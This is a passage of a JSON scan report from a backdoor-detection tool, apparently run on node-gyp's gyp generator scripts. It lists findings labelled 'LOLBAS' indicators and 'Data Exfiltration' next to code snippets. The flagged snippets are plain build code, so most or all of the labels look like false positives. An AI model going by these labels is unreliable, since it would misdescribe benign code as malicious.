                    "rendered": {
                      "text": "        return result\n\n    def is_build_impacted(self):\n        \"\"\"Returns true if the supplied files impact the build at all.\"\"\"\n        return self._changed_targets\n\n    def find_matching_test_target_names(self):\n",
                      "markdown": "`        return result\n\n    def is_build_impacted(self):\n        \"\"\"Returns true if the supplied files impact the build at all.\"\"\"\n        return self._changed_targets\n\n    def find_matching_test_target_names(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 469,
                  "startColumn": 28,
                  "endLine": 469,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\ndef _GetTargetsDependingOnMatchingTargets(possible_targets):\n    \"\"\"Returns the list of Targets in |possible_targets| that depend (either\n  directly on indirectly) on at least one of the targets containing the files\n  supplied as input to analyzer.\n  possible_targets: targets to search from.\"\"\"\n    found = []\n",
                    "rendered": {
                      "text": "\ndef _GetTargetsDependingOnMatchingTargets(possible_targets):\n    \"\"\"Returns the list of Targets in |possible_targets| that depend (either\n  directly on indirectly) on at least one of the targets containing the files\n  supplied as input to analyzer.\n  possible_targets: targets to search from.\"\"\"\n    found = []\n",
                      "markdown": "`\ndef _GetTargetsDependingOnMatchingTargets(possible_targets):\n    \"\"\"Returns the list of Targets in |possible_targets| that depend (either\n  directly on indirectly) on at least one of the targets containing the files\n  supplied as input to analyzer.\n  possible_targets: targets to search from.\"\"\"\n    found = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 344,
                  "startColumn": 61,
                  "endLine": 344,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    \"\"\"Returns a tuple of the following:\n  . A dictionary mapping from fully qualified name to Target.\n  . A list of the targets that have a source file in |files|.\n  . Targets that constitute the 'all' target. See description at top of file\n    for details on the 'all' target.\n  This sets the |match_status| of the targets that contain any of the source\n  files in |files| to MATCH_STATUS_MATCHES.\n",
                    "rendered": {
                      "text": "    \"\"\"Returns a tuple of the following:\n  . A dictionary mapping from fully qualified name to Target.\n  . A list of the targets that have a source file in |files|.\n  . Targets that constitute the 'all' target. See description at top of file\n    for details on the 'all' target.\n  This sets the |match_status| of the targets that contain any of the source\n  files in |files| to MATCH_STATUS_MATCHES.\n",
                      "markdown": "`    \"\"\"Returns a tuple of the following:\n  . A dictionary mapping from fully qualified name to Target.\n  . A list of the targets that have a source file in |files|.\n  . Targets that constitute the 'all' target. See description at top of file\n    for details on the 'all' target.\n  This sets the |match_status| of the targets that contain any of the source\n  files in |files| to MATCH_STATUS_MATCHES.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 320,
                  "startColumn": 36,
                  "endLine": 320,
                  "endColumn": 40,
                  "snippet": {
                    "text": "\n\ndef _GetOrCreateTargetByName(targets, target_name):\n    \"\"\"Creates or returns the Target at targets[target_name]. If there is no\n  Target for |target_name| one is created. Returns a tuple of whether a new\n  Target was created and the Target.\"\"\"\n    if target_name in targets:\n",
                    "rendered": {
                      "text": "\n\ndef _GetOrCreateTargetByName(targets, target_name):\n    \"\"\"Creates or returns the Target at targets[target_name]. If there is no\n  Target for |target_name| one is created. Returns a tuple of whether a new\n  Target was created and the Target.\"\"\"\n    if target_name in targets:\n",
                      "markdown": "`\n\ndef _GetOrCreateTargetByName(targets, target_name):\n    \"\"\"Creates or returns the Target at targets[target_name]. If there is no\n  Target for |target_name| one is created. Returns a tuple of whether a new\n  Target was created and the Target.\"\"\"\n    if target_name in targets:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 41,
                  "endLine": 131,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n\ndef _ResolveParent(path, base_path_components):\n    \"\"\"Resolves |path|, which starts with at least one '../'. Returns an empty\n  string if the path shouldn't be considered. See _AddSources() for a\n  description of |base_path_components|.\"\"\"\n    depth = 0\n",
                    "rendered": {
                      "text": "\n\ndef _ResolveParent(path, base_path_components):\n    \"\"\"Resolves |path|, which starts with at least one '../'. Returns an empty\n  string if the path shouldn't be considered. See _AddSources() for a\n  description of |base_path_components|.\"\"\"\n    depth = 0\n",
                      "markdown": "`\n\ndef _ResolveParent(path, base_path_components):\n    \"\"\"Resolves |path|, which starts with at least one '../'. Returns an empty\n  string if the path shouldn't be considered. See _AddSources() for a\n  description of |base_path_components|.\"\"\"\n    depth = 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 75,
                  "endLine": 32,
                  "snippet": {
                    "text": "  build, such as running tests.\nstatus: outputs one of three values: none of the supplied files were found,\n  one of the include files changed so that it should be assumed everything\n  changed (in this case test_targets and compile_targets are not output) or at\n  least one file was found.\ninvalid_targets: list of supplied targets that were not found.\n\nExample:\n",
                    "rendered": {
                      "text": "  build, such as running tests.\nstatus: outputs one of three values: none of the supplied files were found,\n  one of the include files changed so that it should be assumed everything\n  changed (in this case test_targets and compile_targets are not output) or at\n  least one file was found.\ninvalid_targets: list of supplied targets that were not found.\n\nExample:\n",
                      "markdown": "`  build, such as running tests.\nstatus: outputs one of three values: none of the supplied files were found,\n  one of the include files changed so that it should be assumed everything\n  changed (in this case test_targets and compile_targets are not output) or at\n  least one file was found.\ninvalid_targets: list of supplied targets that were not found.\n\nExample:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 675,
                  "startColumn": 9,
                  "endLine": 675,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    def find_matching_test_target_names(self):\n        \"\"\"Returns the set of output test targets.\"\"\"\n        assert self.is_build_impacted()\n        # Find the test targets first. 'all' is special cased to mean all the\n        # root targets. To deal with all the supplied |test_targets| are expanded\n        # to include the root targets during lookup. If any of the root targets\n        # match, we remove it and replace it with 'all'.\n",
                    "rendered": {
                      "text": "    def find_matching_test_target_names(self):\n        \"\"\"Returns the set of output test targets.\"\"\"\n        assert self.is_build_impacted()\n        # Find the test targets first. 'all' is special cased to mean all the\n        # root targets. To deal with all the supplied |test_targets| are expanded\n        # to include the root targets during lookup. If any of the root targets\n        # match, we remove it and replace it with 'all'.\n",
                      "markdown": "`    def find_matching_test_target_names(self):\n        \"\"\"Returns the set of output test targets.\"\"\"\n        assert self.is_build_impacted()\n        # Find the test targets first. 'all' is special cased to mean all the\n        # root targets. To deal with all the supplied |test_targets| are expanded\n        # to include the root targets during lookup. If any of the root targets\n        # match, we remove it and replace it with 'all'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 504,
                  "startColumn": 56,
                  "endLine": 504,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    # built easier.\n    # And always add static_libraries that have no dependencies on them from\n    # linkables. This is necessary as the other dependencies on them may be\n    # static libraries themselves, which are not compile time dependencies.\n    if target.in_roots and (\n        target.is_executable\n        or (\n",
                    "rendered": {
                      "text": "    # built easier.\n    # And always add static_libraries that have no dependencies on them from\n    # linkables. This is necessary as the other dependencies on them may be\n    # static libraries themselves, which are not compile time dependencies.\n    if target.in_roots and (\n        target.is_executable\n        or (\n",
                      "markdown": "`    # built easier.\n    # And always add static_libraries that have no dependencies on them from\n    # linkables. This is necessary as the other dependencies on them may be\n    # static libraries themselves, which are not compile time dependencies.\n    if target.in_roots and (\n        target.is_executable\n        or (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 344,
                  "startColumn": 64,
                  "endLine": 344,
                  "endColumn": 69,
                  "snippet": {
                    "text": "    \"\"\"Returns a tuple of the following:\n  . A dictionary mapping from fully qualified name to Target.\n  . A list of the targets that have a source file in |files|.\n  . Targets that constitute the 'all' target. See description at top of file\n    for details on the 'all' target.\n  This sets the |match_status| of the targets that contain any of the source\n  files in |files| to MATCH_STATUS_MATCHES.\n",
                    "rendered": {
                      "text": "    \"\"\"Returns a tuple of the following:\n  . A dictionary mapping from fully qualified name to Target.\n  . A list of the targets that have a source file in |files|.\n  . Targets that constitute the 'all' target. See description at top of file\n    for details on the 'all' target.\n  This sets the |match_status| of the targets that contain any of the source\n  files in |files| to MATCH_STATUS_MATCHES.\n",
                      "markdown": "`    \"\"\"Returns a tuple of the following:\n  . A dictionary mapping from fully qualified name to Target.\n  . A list of the targets that have a source file in |files|.\n  . Targets that constitute the 'all' target. See description at top of file\n    for details on the 'all' target.\n  This sets the |match_status| of the targets that contain any of the source\n  files in |files| to MATCH_STATUS_MATCHES.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 4,
                  "endLine": 6,
                  "endColumn": 12,
                  "snippet": {
                    "text": "# found in the LICENSE file.\n\n\"\"\"\nThis script is intended for use as a GYP_GENERATOR. It takes as input (by way of\nthe generator flag config_path) the path of a json file that dictates the files\nand targets to search for. The following keys are supported:\nfiles: list of paths (relative) of the files to search for.\n",
                    "rendered": {
                      "text": "# found in the LICENSE file.\n\n\"\"\"\nThis script is intended for use as a GYP_GENERATOR. It takes as input (by way of\nthe generator flag config_path) the path of a json file that dictates the files\nand targets to search for. The following keys are supported:\nfiles: list of paths (relative) of the files to search for.\n",
                      "markdown": "`# found in the LICENSE file.\n\n\"\"\"\nThis script is intended for use as a GYP_GENERATOR. It takes as input (by way of\nthe generator flag config_path) the path of a json file that dictates the files\nand targets to search for. The following keys are supported:\nfiles: list of paths (relative) of the files to search for.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 580,
                  "startColumn": 51,
                  "endLine": 580,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        for target in values[\"test_targets\"]:\n            print(\"\\t\", target)\n\n    output_path = params.get(\"generator_flags\", {}).get(\"analyzer_output_path\", None)\n    if not output_path:\n        print(json.dumps(values))\n        return\n",
                    "rendered": {
                      "text": "        for target in values[\"test_targets\"]:\n            print(\"\\t\", target)\n\n    output_path = params.get(\"generator_flags\", {}).get(\"analyzer_output_path\", None)\n    if not output_path:\n        print(json.dumps(values))\n        return\n",
                      "markdown": "`        for target in values[\"test_targets\"]:\n            print(\"\\t\", target)\n\n    output_path = params.get(\"generator_flags\", {}).get(\"analyzer_output_path\", None)\n    if not output_path:\n        print(json.dumps(values))\n        return\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 580,
                  "startColumn": 24,
                  "endLine": 580,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        for target in values[\"test_targets\"]:\n            print(\"\\t\", target)\n\n    output_path = params.get(\"generator_flags\", {}).get(\"analyzer_output_path\", None)\n    if not output_path:\n        print(json.dumps(values))\n        return\n",
                    "rendered": {
                      "text": "        for target in values[\"test_targets\"]:\n            print(\"\\t\", target)\n\n    output_path = params.get(\"generator_flags\", {}).get(\"analyzer_output_path\", None)\n    if not output_path:\n        print(json.dumps(values))\n        return\n",
                      "markdown": "`        for target in values[\"test_targets\"]:\n            print(\"\\t\", target)\n\n    output_path = params.get(\"generator_flags\", {}).get(\"analyzer_output_path\", None)\n    if not output_path:\n        print(json.dumps(values))\n        return\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 412,
                  "startColumn": 44,
                  "endLine": 412,
                  "endColumn": 49,
                  "snippet": {
                    "text": "                    break\n\n        # Add dependencies to visit as well as updating back pointers for deps.\n        for dep in target_dicts[target_name].get(\"dependencies\", []):\n            targets_to_visit.append(dep)\n\n            created_dep_target, dep_target = _GetOrCreateTargetByName(\n",
                    "rendered": {
                      "text": "                    break\n\n        # Add dependencies to visit as well as updating back pointers for deps.\n        for dep in target_dicts[target_name].get(\"dependencies\", []):\n            targets_to_visit.append(dep)\n\n            created_dep_target, dep_target = _GetOrCreateTargetByName(\n",
                      "markdown": "`                    break\n\n        # Add dependencies to visit as well as updating back pointers for deps.\n        for dep in target_dicts[target_name].get(\"dependencies\", []):\n            targets_to_visit.append(dep)\n\n            created_dep_target, dep_target = _GetOrCreateTargetByName(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 336,
                  "startColumn": 22,
                  "endLine": 336,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    return bool(\n        target_dict[\"type\"] != \"none\"\n        or target_dict.get(\"actions\")\n        or target_dict.get(\"rules\")\n    )\n\n\n",
                    "rendered": {
                      "text": "    return bool(\n        target_dict[\"type\"] != \"none\"\n        or target_dict.get(\"actions\")\n        or target_dict.get(\"rules\")\n    )\n\n\n",
                      "markdown": "`    return bool(\n        target_dict[\"type\"] != \"none\"\n        or target_dict.get(\"actions\")\n        or target_dict.get(\"rules\")\n    )\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 335,
                  "startColumn": 22,
                  "endLine": 335,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    # If a 'none' target has rules or actions we assume it requires a build.\n    return bool(\n        target_dict[\"type\"] != \"none\"\n        or target_dict.get(\"actions\")\n        or target_dict.get(\"rules\")\n    )\n\n",
                    "rendered": {
                      "text": "    # If a 'none' target has rules or actions we assume it requires a build.\n    return bool(\n        target_dict[\"type\"] != \"none\"\n        or target_dict.get(\"actions\")\n        or target_dict.get(\"rules\")\n    )\n\n",
                      "markdown": "`    # If a 'none' target has rules or actions we assume it requires a build.\n    return bool(\n        target_dict[\"type\"] != \"none\"\n        or target_dict.get(\"actions\")\n        or target_dict.get(\"rules\")\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 286,
                  "startColumn": 43,
                  "endLine": 286,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n        self.test_target_names = set(config.get(\"test_targets\", []))\n\n\ndef _WasBuildFileModified(build_file, data, files, toplevel_dir):\n",
                    "rendered": {
                      "text": "        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n        self.test_target_names = set(config.get(\"test_targets\", []))\n\n\ndef _WasBuildFileModified(build_file, data, files, toplevel_dir):\n",
                      "markdown": "`        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n        self.test_target_names = set(config.get(\"test_targets\", []))\n\n\ndef _WasBuildFileModified(build_file, data, files, toplevel_dir):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 284,
                  "startColumn": 18,
                  "endLine": 284,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            raise Exception(\"config_path must be a JSON file containing a dictionary\")\n        self.files = config.get(\"files\", [])\n        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n        self.test_target_names = set(config.get(\"test_targets\", []))\n\n",
                    "rendered": {
                      "text": "            raise Exception(\"config_path must be a JSON file containing a dictionary\")\n        self.files = config.get(\"files\", [])\n        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n        self.test_target_names = set(config.get(\"test_targets\", []))\n\n",
                      "markdown": "`            raise Exception(\"config_path must be a JSON file containing a dictionary\")\n        self.files = config.get(\"files\", [])\n        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n        self.test_target_names = set(config.get(\"test_targets\", []))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 282,
                  "startColumn": 27,
                  "endLine": 282,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            raise Exception(\"Unable to parse config file \" + config_path + str(e))\n        if not isinstance(config, dict):\n            raise Exception(\"config_path must be a JSON file containing a dictionary\")\n        self.files = config.get(\"files\", [])\n        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n",
                    "rendered": {
                      "text": "            raise Exception(\"Unable to parse config file \" + config_path + str(e))\n        if not isinstance(config, dict):\n            raise Exception(\"config_path must be a JSON file containing a dictionary\")\n        self.files = config.get(\"files\", [])\n        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n",
                      "markdown": "`            raise Exception(\"Unable to parse config file \" + config_path + str(e))\n        if not isinstance(config, dict):\n            raise Exception(\"config_path must be a JSON file containing a dictionary\")\n        self.files = config.get(\"files\", [])\n        self.additional_compile_target_names = set(\n            config.get(\"additional_compile_targets\", [])\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 269,
                  "startColumn": 37,
                  "endLine": 269,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        \"\"\"Initializes Config. This is a separate method as it raises an exception\n    if there is a parse error.\"\"\"\n        generator_flags = params.get(\"generator_flags\", {})\n        config_path = generator_flags.get(\"config_path\", None)\n        if not config_path:\n            return\n        try:\n",
                    "rendered": {
                      "text": "        \"\"\"Initializes Config. This is a separate method as it raises an exception\n    if there is a parse error.\"\"\"\n        generator_flags = params.get(\"generator_flags\", {})\n        config_path = generator_flags.get(\"config_path\", None)\n        if not config_path:\n            return\n        try:\n",
                      "markdown": "`        \"\"\"Initializes Config. This is a separate method as it raises an exception\n    if there is a parse error.\"\"\"\n        generator_flags = params.get(\"generator_flags\", {})\n        config_path = generator_flags.get(\"config_path\", None)\n        if not config_path:\n            return\n        try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/analyzer.py"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 32,
                  "endLine": 268,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    def Init(self, params):\n        \"\"\"Initializes Config. This is a separate method as it raises an exception\n    if there is a parse error.\"\"\"\n        generator_flags = params.get(\"generator_flags\", {})\n        config_path = generator_flags.get(\"config_path\", None)\n        if not config_path:\n            return\n",
                    "rendered": {
                      "text": "    def Init(self, params):\n        \"\"\"Initializes Config. This is a separate method as it raises an exception\n    if there is a parse error.\"\"\"\n        generator_flags = params.get(\"generator_flags\", {})\n        config_path = generator_flags.get(\"config_path\", None)\n        if not config_path:\n            return\n",
                      "markdown": "`    def Init(self, params):\n        \"\"\"Initializes Config. This is a separate method as it raises an exception\n    if there is a parse error.\"\"\"\n        generator_flags = params.get(\"generator_flags\", {})\n        config_path = generator_flags.get(\"config_path\", None)\n        if not config_path:\n            return\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/gypd.py"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 48,
                  "endLine": 84,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        input_file_stem = input_file[:-4]\n        output_file = input_file_stem + params[\"options\"].suffix + \".gypd\"\n\n        output_files[output_file] = output_files.get(output_file, input_file)\n\n    for output_file, input_file in output_files.items():\n        output = open(output_file, \"w\")\n",
                    "rendered": {
                      "text": "        input_file_stem = input_file[:-4]\n        output_file = input_file_stem + params[\"options\"].suffix + \".gypd\"\n\n        output_files[output_file] = output_files.get(output_file, input_file)\n\n    for output_file, input_file in output_files.items():\n        output = open(output_file, \"w\")\n",
                      "markdown": "`        input_file_stem = input_file[:-4]\n        output_file = input_file_stem + params[\"options\"].suffix + \".gypd\"\n\n        output_files[output_file] = output_files.get(output_file, input_file)\n\n    for output_file, input_file in output_files.items():\n        output = open(output_file, \"w\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 1152,
                  "startColumn": 33,
                  "endLine": 1152,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            return\n        android_modules[android_module] = qualified_target\n\n        # Our root_makefile lives at the source root.  Compute the relative path\n        # from there to the output_file for including.\n        mkfile_rel_path = gyp.common.RelativePath(\n            output_file, os.path.dirname(makefile_path)\n",
                    "rendered": {
                      "text": "            return\n        android_modules[android_module] = qualified_target\n\n        # Our root_makefile lives at the source root.  Compute the relative path\n        # from there to the output_file for including.\n        mkfile_rel_path = gyp.common.RelativePath(\n            output_file, os.path.dirname(makefile_path)\n",
                      "markdown": "`            return\n        android_modules[android_module] = qualified_target\n\n        # Our root_makefile lives at the source root.  Compute the relative path\n        # from there to the output_file for including.\n        mkfile_rel_path = gyp.common.RelativePath(\n            output_file, os.path.dirname(makefile_path)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/android.py"
                },
                "region": {
                  "startLine": 244,
                  "startColumn": 9,
                  "endLine": 244,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = (\"path\", self.output_binary)\n\n        # Update global list of link dependencies.\n        if self.type == \"static_library\":\n            target_link_deps[qualified_target] = (\"static\", self.android_module)\n        elif self.type == \"shared_library\":\n",
